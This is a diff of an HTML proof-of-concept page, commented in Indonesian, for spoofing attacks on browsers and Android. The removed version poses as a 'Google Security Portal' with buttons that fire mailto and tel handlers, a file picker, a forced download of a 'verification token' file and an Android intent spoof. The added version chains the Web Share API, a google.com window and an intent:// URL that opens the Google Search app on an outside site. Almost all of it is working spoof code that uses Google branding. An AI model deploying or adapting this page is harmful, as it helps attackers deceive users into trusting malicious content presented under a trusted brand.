@@ -3,12 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker, Protocol & Intent Spoof PoC - Hardened</title>
+    <title>Web Share API & Intent Spoof PoC</title>
     <style>
+        :root {
+            --primary-color: #1a73e8;
+            --primary-hover: #1557b0;
+            --bg-color: #f8f9fa;
+            --card-bg: #ffffff;
+            --text-main: #202124;
+            --text-secondary: #5f6368;
+            --border-color: #dadce0;
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f8f9fa;
-            color: #202124;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -18,60 +28,82 @@
             padding: 20px;
             text-align: center;
         }
+
+        .card {
+            background: var(--card-bg);
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            border: 1px solid var(--border-color);
+            max-width: 420px;
+            width: 100%;
+        }
+
         .banner {
-            font-size: 13px;
-            color: #5f6368;
-            margin-bottom: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
             text-transform: uppercase;
-            letter-spacing: 0.8px;
+            letter-spacing: 1.2px;
         }
+
         h1 {
-            font-size: 20px;
-            color: #1a73e8;
-            margin-bottom: 24px;
+            font-size: 22px;
+            color: var(--text-main);
+            margin-top: 0;
+            margin-bottom: 12px;
         }
+
+        p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+
         .button-container {
             display: flex;
             flex-direction: column;
-            gap: 12px;
-            width: 100%;
-            max-width: 340px;
+            gap: 14px;
         }
-        a.spoof-link {
+
+        button.button-link {
+            width: 100%;
             display: inline-block;
-            background-color: #1a73e8;
+            background-color: var(--primary-color);
             color: white;
-            padding: 14px 28px;
-            text-decoration: none;
+            padding: 14px 24px;
+            border: none;
             font-weight: 600;
-            font-size: 15px;
+            font-size: 14px;
             border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
-            transition: background-color 0.2s;
+            box-shadow: 0 2px 6px rgba(26, 115, 232, 0.3);
+            transition: background-color 0.2s, transform 0.1s;
             cursor: pointer;
         }
-        a.spoof-link:active {
-            background-color: #1557b0;
+
+        button.button-link:hover {
+            background-color: var(--primary-hover);
         }
-        .preview-container {
-            margin-top: 25px;
-            max-width: 280px;
+
+        button.button-link:active {
+            transform: scale(0.98);
+        }
+
+        .status-box {
+            margin-top: 20px;
+            padding: 10px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            background: #f1f3f4;
+            border-radius: 6px;
             display: none;
-        }
-        .preview-container img {
-            width: 100%;
-            border-radius: 8px;
-            border: 1px solid #dadce0;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
-        }
-        .file-info {
-            margin-top: 10px;
-            font-size: 13px;
-            color: #5f6368;
             word-break: break-all;
         }
+
         .footer-note {
-            margin-top: 30px;
+            margin-top: 25px;
             font-size: 11px;
             color: #9aa0a6;
         }
@@ -79,152 +111,55 @@
 </head>
 <body>
 
-    <div class="banner">Google Security Portal</div>
-    <h1>Secure Document Verification</h1>
+    <div class="card">
+        <div class="banner">Security Research Portal</div>
+        <h1>Web Share & Intent Chain</h1>
+        <p>Klik tombol di bawah untuk memicu Web Share API, mengarahkan konteks ke google.com, dan mengeksekusi intent.</p>
 
-    <!-- Container dengan tombol lengkap termasuk Android Intent Spoof -->
-    <div class="button-container">
-        <a href="#" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
-        <a href="#" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
-        <a href="#" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
-        <a href="#" class="spoof-link" id="targetLinkDownload" data-intent="download_bypass">Open Window & Bypass Download</a>
-        <a href="#" class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
+        <div class="button-container">
+            <button class="button-link" id="shareButton">
+                Share & Trigger Intent Chain
+            </button>
+        </div>
+
+        <div class="status-box" id="statusBox">Status: Ready...</div>
     </div>
 
-    <!-- Uploaded Image Preview Box -->
-    <div class="preview-container" id="previewBox">
-        <img id="imagePreview" src="" alt="File Preview">
-        <div class="file-info" id="fileInfo"></div>
-    </div>
-
-    <div class="footer-note">Cloud-secured verification system.</div>
+    <div class="footer-note">Authorized security assessment environment.</div>
 
     <script>
-        let triggered = false;
+        const shareButton = document.getElementById('shareButton');
+        const statusBox = document.getElementById('statusBox');
 
-        // Vektor khusus Download Bypass yang dieksekusi langsung untuk mempertahankan Transient User Activation
-        const executeDownloadBypass = (intent) => {
-            const previewBox = document.getElementById("previewBox");
-            const imagePreview = document.getElementById("imagePreview");
-            const fileInfo = document.getElementById("fileInfo");
+        shareButton.addEventListener('click', async () => {
+            statusBox.style.display = 'block';
+            statusBox.innerText = 'Status: Initializing Web Share & Google Context...';
 
-            try {
-                // Membuat payload binary untuk memaksa unduhan langsung tanpa intervensi dialog ekstensi/sandbox
-                const payloadContent = "Google Security Verification Payload - Intent Bypass Token: " + intent + "\nTimestamp: " + Date.now();
-                const blob = new Blob([payloadContent], { type: 'application/octet-stream' });
-                const blobUrl = URL.createObjectURL(blob);
-                
-                // Membuat elemen anchor secara dinamis di dalam DOM saat interaksi pengguna aktif
-                const tempAnchor = document.createElement('a');
-                tempAnchor.href = blobUrl;
-                tempAnchor.download = "security_verification_token.bin";
-                tempAnchor.style.display = "none";
-                
-                document.body.appendChild(tempAnchor);
-                tempAnchor.click(); // Trigger langsung download
-                
-                // Cleanup setelah trigger
-                setTimeout(() => {
-                    document.body.removeChild(tempAnchor);
-                    URL.revokeObjectURL(blobUrl);
-                }, 500);
+            // 1. Memaksa navigasi awal ke google.com di jendela utama/background tab secara bersamaan
+            const googleWindow = window.open('https://www.google.com', '_blank');
 
-                fileInfo.innerText = `Successfully triggered forced download bypass vector for intent: [${intent}]`;
-                imagePreview.src = "";
-                previewBox.style.display = "block";
-            } catch (err) {
-                fileInfo.innerText = `Download blocked/failed: ${err.message}`;
-                previewBox.style.display = "block";
-            }
-        };
-
-        const executeAttackVector = (actionType, intent) => {
-            if (actionType === 'downloadbypass') {
-                executeDownloadBypass(intent);
-                return;
-            }
-
-            if (triggered) return;
-            triggered = true;
-
-            setTimeout(async () => {
+            // 2. Memanggil Web Share API (memanfaatkan user activation yang sah secara native)
+            if (navigator.share) {
                 try {
-                    const previewBox = document.getElementById("previewBox");
-                    const imagePreview = document.getElementById("imagePreview");
-                    const fileInfo = document.getElementById("fileInfo");
-
-                    if (actionType === 'mailto') {
-                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
-                        const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
-                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
-                        fileInfo.innerText = `Triggered mailto protocol with intent: [${intent}]`;
-                        imagePreview.src = "";
-                        previewBox.style.display = "block";
-                    } 
-                    else if (actionType === 'tel') {
-                        window.location.href = "tel:+18005550199";
-                        fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
-                        imagePreview.src = "";
-                        previewBox.style.display = "block";
-                    } 
-                    else if (actionType === 'filepicker') {
-                        const [fileHandle] = await window.showOpenFilePicker({
-                            multiple: false,
-                            types: [{
-                                description: 'Images & Documents',
-                                accept: { 
-                                    'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
-                                    'application/pdf': ['.pdf']
-                                }
-                            }]
-                        });
-
-                        const file = await fileHandle.getFile();
-                        fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;
-
-                        if (file.type.startsWith('image/')) {
-                            imagePreview.src = URL.createObjectURL(file);
-                            previewBox.style.display = "block";
-                        } else {
-                            imagePreview.src = "";
-                            previewBox.style.display = "block";
-                        }
-                    }
-                    else if (actionType === 'intentspoof') {
-                        const intentUrl = "intent:www.ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-                        window.location.href = intentUrl;
-                        fileInfo.innerText = `Triggered Android intent spoof vector for intent: [${intent}]`;
-                        imagePreview.src = "";
-                        previewBox.style.display = "block";
-                    }
-
+                    await navigator.share({
+                        title: 'Google Security Verification',
+                        text: 'Secure document verification portal link.',
+                        url: 'https://www.google.com'
+                    });
+                    statusBox.innerText = 'Status: Web Share completed. Dispatched intent...';
                 } catch (err) {
-                    console.debug("Handler cancelled or blocked:", err.message);
-                } finally {
-                    setTimeout(() => { triggered = false; }, 1000);
+                    statusBox.innerText = 'Status: Share dismissed/blocked, proceeding with intent...';
                 }
-            }, 2400);
-        };
+            } else {
+                statusBox.innerText = 'Status: Web Share API not supported, executing fallback...';
+            }
 
-        // Event listeners untuk tombol-tombol
-        const linkMailto = document.getElementById("targetLinkMailto");
-        linkMailto.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('mailto', linkMailto.getAttribute('data-intent')); });
-
-        const linkTel = document.getElementById("targetLinkTel");
-        linkTel.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('tel', linkTel.getAttribute('data-intent')); });
-
-        const linkFile = document.getElementById("targetLinkFile");
-        linkFile.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('filepicker', linkFile.getAttribute('data-intent')); });
-
-        // Handler khusus Download Bypass menggunakan event click langsung untuk mengamankan aktivasi browser
-        const linkDownload = document.getElementById("targetLinkDownload");
-        linkDownload.addEventListener("click", (e) => {
-            e.preventDefault();
-            executeAttackVector('downloadbypass', linkDownload.getAttribute('data-intent'));
+            // 3. Eksekusi intent redirect setelah interaksi share / pembukaan google context
+            setTimeout(() => {
+                const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+                window.location.replace(intentUrl);
+            }, 500);
         });
-
-        const linkIntent = document.getElementById("targetLinkIntent");
-        linkIntent.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('intentspoof', linkIntent.getAttribute('data-intent')); });
     </script>
 
 </body>
